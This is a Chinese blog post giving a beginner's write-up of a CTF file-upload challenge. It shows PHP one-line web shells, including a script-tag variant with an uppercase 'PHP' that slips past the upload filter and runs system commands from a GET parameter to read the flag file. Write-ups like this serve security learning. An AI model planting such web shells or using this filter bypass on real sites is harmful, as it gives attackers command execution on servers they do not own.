<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 百度杯CTF比赛Writeup · Uknow - Stay hungry Stay foolish</title><meta name="description" content="百度杯CTF比赛Writeup - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">百度杯CTF比赛Writeup</h1><div class="post-time">Sep 3, 2016</div><div class="post-content"><!-- ttoc -->
<h2><span id="0x00-前言">0x00 前言</span></h2><p>i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/psb.jpg" alt=""></p>
<h2><span id="0x01-正文">0x01 正文</span></h2><h3><span id="upload">Upload</span></h3><h4><span id="题目">题目</span></h4><p>Upload<br>描述：想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中    </p>
<h4><span id="解题思路">解题思路</span></h4><p>打开题目题目链接，是一个文件上传的题。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png" alt=""><br>然后打开/flag.php<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png" alt=""><br>直接上传传统的PHP一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval_r($_POST[sb])?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png" alt=""><br>发现过滤了 &lt;?php</p>
<p>然后在网上找到了另一种php一句话的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png" alt=""><br>查看源码显示过滤了php</p>
<p>php改为PHP继续上传<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png" alt=""><br>查看源码没有显示</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8721.png" alt=""><br>找这里就没思路了，吃饭。去图书馆，下午回来问问大表哥</p>
<p>表哥告诉我不要传传统的PHP一句话<br>换个姿势，然后告诉我 PHP有4种开始和结束标记<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>果断百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">&lt;?php echo &apos;if you want to serve XHTML or XML documents, do like this&apos;; ?&gt;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">echo &apos;some editors (like FrontPage) don&apos;t</span><br><span class="line">like processing instructions&apos;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">&lt;? echo &apos;this is the simplest, an SGML processing instruction&apos;; ?&gt;</span><br><span class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</span><br><span class="line"></span><br><span class="line">4.</span><br><span class="line">&lt;% echo &apos;You may optionally use ASP-style tags&apos;; %&gt;</span><br><span class="line">&lt;%= $variable; # This is a shortcut for &quot;&lt;% echo . . .&quot; %&gt;</span><br></pre></td></tr></table></figure></p>
<p>发现第二种上午用过，但是不行<br>表哥说换个姿势，用system()函数调用系统命令<br>由于个人能力太差，写了半天才写出一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>PHP大写绕过，上传！<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png" alt=""><br>执行3.php?id=ls<br>发现php_errors.log日志文件，找到表哥说的绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/u</span><br></pre></td></tr></table></figure></p>
<p>然后表哥说直接命令查就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd  //同样得到 /var/www/html/u</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>然后利用cat 查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1．命令格式：</span><br><span class="line"></span><br><span class="line">cat [选项] [文件]...</span><br><span class="line"></span><br><span class="line">2．命令功能：</span><br><span class="line"></span><br><span class="line">cat主要有三大功能：</span><br><span class="line"></span><br><span class="line">1.一次显示整个文件:cat filename</span><br><span class="line"></span><br><span class="line">2.从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件.</span><br><span class="line"></span><br><span class="line">3.将几个文件合并为一个文件:cat file1 file2 &gt; file</span><br><span class="line"></span><br><span class="line">3．命令参数：</span><br><span class="line"></span><br><span class="line">-A, --show-all           等价于 -vET</span><br><span class="line"></span><br><span class="line">-b, --number-nonblank    对非空输出行编号</span><br><span class="line"></span><br><span class="line">-e                       等价于 -vE</span><br><span class="line"></span><br><span class="line">-E, --show-ends          在每行结束处显示 $</span><br><span class="line"></span><br><span class="line">-n, --number     对输出的所有行编号,由1开始对所有输出的行数编号</span><br><span class="line"></span><br><span class="line">-s, --squeeze-blank  有连续两行以上的空白行，就代换为一行的空白行 </span><br><span class="line"></span><br><span class="line">-t                       与 -vT 等价</span><br><span class="line"></span><br><span class="line">-T, --show-tabs          将跳格字符显示为 ^I</span><br><span class="line"></span><br><span class="line">-u                       (被忽略)</span><br><span class="line"></span><br><span class="line">-v, --show-nonprinting   使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外</span><br></pre></td></tr></table></figure></p>
<p>根据上面的知识，构建下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../u/3.php?id=cat /var/www/html/flag.php</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png" alt=""><br>查看源码得到flag,唉！不容易，自己的知识太少了。</p>
<h4><span id="flag">Flag</span></h4><p>flag{90969a8b-9e19-4247-8654-a10eeeb48314}</p>
<h4><span id="此题小结">此题小结</span></h4><p>才发现做个CTF不是那么容易的，一个看起来简单的上传绕过的题目。包含了PHP，Linxu系统命令，等等很多内容。也发现了自己有很多不足。幸亏有表哥的帮助，在此感觉依风表哥帮助和指导，下面两个题等明天在看别人的Writeup或者请教表哥吧！</p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/Linux基础入门笔记.html" class="prev">上一篇</a><a href="/posts/notes/MySQL数据库基础与实例.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2020 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>